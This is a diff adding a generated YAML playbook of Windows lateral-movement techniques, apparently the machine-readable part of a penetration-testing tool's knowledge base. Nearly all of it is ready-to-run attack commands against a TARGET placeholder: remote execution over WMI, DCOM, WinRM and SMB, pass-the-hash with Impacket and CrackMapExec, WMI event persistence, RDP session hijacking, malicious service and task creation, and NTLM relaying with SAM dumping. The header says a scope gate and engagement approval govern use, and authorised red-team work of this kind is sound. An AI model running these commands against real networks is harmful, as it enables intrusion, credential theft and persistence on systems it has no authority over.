@@ -1,0 +1,372 @@
+# GENERATED from lateral_movement.md by scripts/playbooks_to_yaml.py — do not hand-edit.
+#
+# The markdown stays authoritative: it is what a human reads and what RAG
+# ingests. This is an EXTRACT of the steps in it, so that something other
+# than a language model can act on them. Re-generate after editing the
+# markdown; tests/test_playbooks.py fails if the two drift.
+#
+# access_required is a conservative heuristic, recorded so a consumer can
+# FILTER — never so anything can decide to run. Authorisation stays with
+# the scope gate and the engagement's approval.
+name: lateral_movement
+title: Lateral Movement Techniques
+source: lateral_movement.md
+generated_by: scripts/playbooks_to_yaml.py
+phases:
+- id: wmi-windows-management-instrumentation
+  name: WMI (Windows Management Instrumentation)
+  steps:
+  - id: wmi-windows-management-instrumentation.remote-process-creation
+    title: Remote Process Creation
+    access_required: credential
+    mutates: true
+    source_line: 12
+    commands:
+    - lang: powershell
+      command: Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "cmd.exe
+        /c whoami > C:\temp\out.txt"
+    - lang: powershell
+      command: wmic /node:TARGET process call create "cmd.exe /c whoami > C:\temp\out.txt"
+    - lang: powershell
+      command: wmic /node:TARGET /user:DOMAIN\user /password:pass process call create "powershell -enc
+        BASE64"
+  - id: wmi-windows-management-instrumentation.impacket-wmiexec
+    title: Impacket wmiexec
+    access_required: credential
+    mutates: false
+    source_line: 24
+    commands:
+    - lang: bash
+      command: wmiexec.py domain/user:password@TARGET
+    - lang: bash
+      command: wmiexec.py domain/user:password@TARGET "whoami"
+    - lang: bash
+      command: wmiexec.py -hashes :NTHASH domain/user@TARGET
+  - id: wmi-windows-management-instrumentation.wmi-event-subscription-persistence-lateral
+    title: WMI Event Subscription (Persistence + Lateral)
+    access_required: shell
+    mutates: true
+    source_line: 36
+    commands:
+    - lang: powershell
+      command: $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments
+        @{ Name = "EvilFilter" EventNamespace = "root\cimv2" QueryLanguage = "WQL" Query = "SELECT * FROM
+        __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour
+        = 12" }
+    - lang: powershell
+      command: $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer
+        -Arguments @{ Name = "EvilConsumer" CommandLineTemplate = "cmd.exe /c calc.exe" }
+    - lang: powershell
+      command: Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments
+        @{ Filter = $Filter Consumer = $Consumer }
+- id: winrm-powershell-remoting
+  name: WinRM / PowerShell Remoting
+  steps:
+  - id: winrm-powershell-remoting.enable-winrm
+    title: Enable WinRM
+    access_required: none
+    mutates: false
+    source_line: 63
+    commands:
+    - lang: powershell
+      command: Enable-PSRemoting -Force
+    - lang: powershell
+      command: Test-WSMan TARGET
+  - id: winrm-powershell-remoting.remote-execution
+    title: Remote Execution
+    access_required: none
+    mutates: false
+    source_line: 72
+    commands:
+    - lang: powershell
+      command: Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)
+    - lang: powershell
+      command: Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }
+    - lang: powershell
+      command: Invoke-Command -ComputerName TARGET -FilePath C:\script.ps1
+    - lang: powershell
+      command: Invoke-Command -ComputerName TARGET1,TARGET2,TARGET3 -ScriptBlock { hostname }
+  - id: winrm-powershell-remoting.evil-winrm
+    title: Evil-WinRM
+    access_required: credential
+    mutates: false
+    source_line: 87
+    commands:
+    - lang: bash
+      command: evil-winrm -i TARGET -u user -p password
+    - lang: bash
+      command: evil-winrm -i TARGET -u user -H NTHASH
+    - lang: bash
+      command: evil-winrm -i TARGET -u user -p password -S
+  - id: winrm-powershell-remoting.winrs-windows-remote-shell
+    title: WinRS (Windows Remote Shell)
+    access_required: none
+    mutates: false
+    source_line: 99
+    commands:
+    - lang: cmd
+      command: winrs -r:TARGET -u:DOMAIN\user -p:password "cmd.exe /c whoami"
+    - lang: cmd
+      command: winrs -r:TARGET "hostname"
+- id: dcom-distributed-component-object-model
+  name: DCOM (Distributed Component Object Model)
+  steps:
+  - id: dcom-distributed-component-object-model.mmc20-application
+    title: MMC20.Application
+    access_required: none
+    mutates: false
+    source_line: 109
+    commands:
+    - lang: powershell
+      command: $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
+    - lang: powershell
+      command: $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
+  - id: dcom-distributed-component-object-model.shellwindows
+    title: ShellWindows
+    access_required: none
+    mutates: false
+    source_line: 115
+    commands:
+    - lang: powershell
+      command: $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39",
+        "TARGET"))
+    - lang: powershell
+      command: $item = $com.Item()
+    - lang: powershell
+      command: $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32",
+        $null, 0)
+  - id: dcom-distributed-component-object-model.shellbrowserwindow
+    title: ShellBrowserWindow
+    access_required: none
+    mutates: true
+    source_line: 122
+    commands:
+    - lang: powershell
+      command: $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880",
+        "TARGET"))
+    - lang: powershell
+      command: $com.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\temp\out.txt", "", $null,
+        0)
+  - id: dcom-distributed-component-object-model.impacket-dcomexec
+    title: Impacket dcomexec
+    access_required: credential
+    mutates: false
+    source_line: 128
+    commands:
+    - lang: bash
+      command: dcomexec.py domain/user:password@TARGET "whoami"
+    - lang: bash
+      command: dcomexec.py -hashes :NTHASH domain/user@TARGET "hostname"
+- id: smb-based-movement
+  name: SMB-Based Movement
+  steps:
+  - id: smb-based-movement.psexec
+    title: PsExec
+    access_required: credential
+    mutates: false
+    source_line: 138
+    commands:
+    - lang: bash
+      command: psexec.py domain/user:password@TARGET
+    - lang: bash
+      command: psexec.py -hashes :NTHASH domain/user@TARGET
+    - lang: bash
+      command: psexec.exe \\TARGET -u DOMAIN\user -p password cmd.exe
+    - lang: bash
+      command: 'psexec.exe \\TARGET -s cmd.exe  # Run as SYSTEM'
+  - id: smb-based-movement.smbexec-no-file-drop
+    title: SMBExec (No File Drop)
+    access_required: credential
+    mutates: false
+    source_line: 149
+    commands:
+    - lang: bash
+      command: smbexec.py domain/user:password@TARGET
+    - lang: bash
+      command: smbexec.py -hashes :NTHASH domain/user@TARGET
+  - id: smb-based-movement.atexec-scheduled-task
+    title: ATExec (Scheduled Task)
+    access_required: credential
+    mutates: false
+    source_line: 155
+    commands:
+    - lang: bash
+      command: atexec.py domain/user:password@TARGET "whoami"
+    - lang: bash
+      command: atexec.py -hashes :NTHASH domain/user@TARGET "hostname"
+  - id: smb-based-movement.crackmapexec
+    title: CrackMapExec
+    access_required: credential
+    mutates: false
+    source_line: 161
+    commands:
+    - lang: bash
+      command: crackmapexec smb TARGET -u user -p password -x "whoami"
+    - lang: bash
+      command: crackmapexec smb TARGET -u user -p password -X "Get-Process"
+    - lang: bash
+      command: crackmapexec smb 192.168.1.0/24 -u user -p password -x "hostname"
+    - lang: bash
+      command: crackmapexec smb TARGET -u user -H NTHASH -x "whoami"
+- id: rdp-remote-desktop
+  name: RDP (Remote Desktop)
+  steps:
+  - id: rdp-remote-desktop.rdp-hijacking-tscon
+    title: RDP Hijacking (tscon)
+    access_required: none
+    mutates: true
+    source_line: 180
+    commands:
+    - lang: cmd
+      command: '# List sessions'
+    - lang: cmd
+      command: query user
+    - lang: cmd
+      command: '# Hijack session (as SYSTEM)'
+    - lang: cmd
+      command: tscon <SESSION_ID> /dest:console
+    - lang: cmd
+      command: '# Create service to get SYSTEM'
+    - lang: cmd
+      command: sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:console"
+    - lang: cmd
+      command: net start sesshijack
+  - id: rdp-remote-desktop.sharprdp-headless-rdp
+    title: SharpRDP (Headless RDP)
+    access_required: none
+    mutates: false
+    source_line: 195
+    commands:
+    - lang: powershell
+      command: SharpRDP.exe computername=TARGET command="cmd.exe /c whoami" username=DOMAIN\user password=password
+  - id: rdp-remote-desktop.xfreerdp
+    title: xfreerdp
+    access_required: none
+    mutates: false
+    source_line: 200
+    commands:
+    - lang: bash
+      command: xfreerdp /v:TARGET /u:user /p:password
+    - lang: bash
+      command: xfreerdp /v:TARGET /u:user /pth:NTHASH
+    - lang: bash
+      command: xfreerdp /v:TARGET /u:user /p:password /sec:tls
+- id: service-based-movement
+  name: Service-Based Movement
+  steps:
+  - id: service-based-movement.remote-service-creation
+    title: Remote Service Creation
+    access_required: none
+    mutates: true
+    source_line: 216
+    commands:
+    - lang: cmd
+      command: '# Create and start remote service'
+    - lang: cmd
+      command: sc \\TARGET create evilsvc binpath= "cmd.exe /c whoami > C:\temp\out.txt"
+    - lang: cmd
+      command: sc \\TARGET start evilsvc
+    - lang: cmd
+      command: sc \\TARGET delete evilsvc
+  - id: service-based-movement.impacket-services
+    title: Impacket services
+    access_required: credential
+    mutates: false
+    source_line: 224
+    commands:
+    - lang: bash
+      command: services.py domain/user:password@TARGET create -name evilsvc -display "Evil Service" -path
+        "cmd.exe /c whoami"
+    - lang: bash
+      command: services.py domain/user:password@TARGET start -name evilsvc
+- id: scheduled-tasks
+  name: Scheduled Tasks
+  steps:
+  - id: scheduled-tasks.remote-task-creation
+    title: Remote Task Creation
+    access_required: none
+    mutates: true
+    source_line: 234
+    commands:
+    - lang: cmd
+      command: '# Create task'
+    - lang: cmd
+      command: schtasks /create /s TARGET /u DOMAIN\user /p password /tn "EvilTask" /tr "cmd.exe /c whoami
+        > C:\temp\out.txt" /sc once /st 00:00
+    - lang: cmd
+      command: '# Run immediately'
+    - lang: cmd
+      command: schtasks /run /s TARGET /tn "EvilTask"
+    - lang: cmd
+      command: '# Delete task'
+    - lang: cmd
+      command: schtasks /delete /s TARGET /tn "EvilTask" /f
+  - id: scheduled-tasks.powershell
+    title: PowerShell
+    access_required: none
+    mutates: true
+    source_line: 246
+    commands:
+    - lang: powershell
+      command: $Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\temp\out.txt"
+    - lang: powershell
+      command: $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+    - lang: powershell
+      command: Register-ScheduledTask -TaskName "EvilTask" -Action $Action -Trigger $Trigger -CimSession
+        TARGET
+- id: smb-relay-attacks
+  name: SMB Relay Attacks
+  steps:
+  - id: smb-relay-attacks.responder-ntlmrelayx
+    title: Responder + ntlmrelayx
+    access_required: none
+    mutates: false
+    source_line: 257
+    commands:
+    - lang: bash
+      command: responder -I eth0 -wrf
+    - lang: bash
+      command: ntlmrelayx.py -tf targets.txt -smb2support
+    - lang: bash
+      command: ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+    - lang: bash
+      command: ntlmrelayx.py -tf targets.txt -smb2support --sam
+  - id: smb-relay-attacks.check-for-smb-signing
+    title: Check for SMB Signing
+    access_required: none
+    mutates: false
+    source_line: 272
+    commands:
+    - lang: bash
+      command: nmap --script smb-security-mode -p445 TARGET
+    - lang: bash
+      command: crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
+- id: ssh-tunneling
+  name: SSH Tunneling
+  steps:
+  - id: ssh-tunneling.local-port-forwarding
+    title: Local Port Forwarding
+    access_required: none
+    mutates: false
+    source_line: 285
+    commands:
+    - lang: bash
+      command: ssh -L 8080:internal-target:80 user@jumpbox
+  - id: ssh-tunneling.remote-port-forwarding
+    title: Remote Port Forwarding
+    access_required: none
+    mutates: false
+    source_line: 293
+    commands:
+    - lang: bash
+      command: ssh -R 8080:localhost:80 user@jumpbox
+  - id: ssh-tunneling.dynamic-socks-proxy
+    title: Dynamic SOCKS Proxy
+    access_required: none
+    mutates: false
+    source_line: 301
+    commands:
+    - lang: bash
+      command: ssh -D 9050 user@jumpbox
+    - lang: bash
+      command: proxychains nmap -sT internal-target
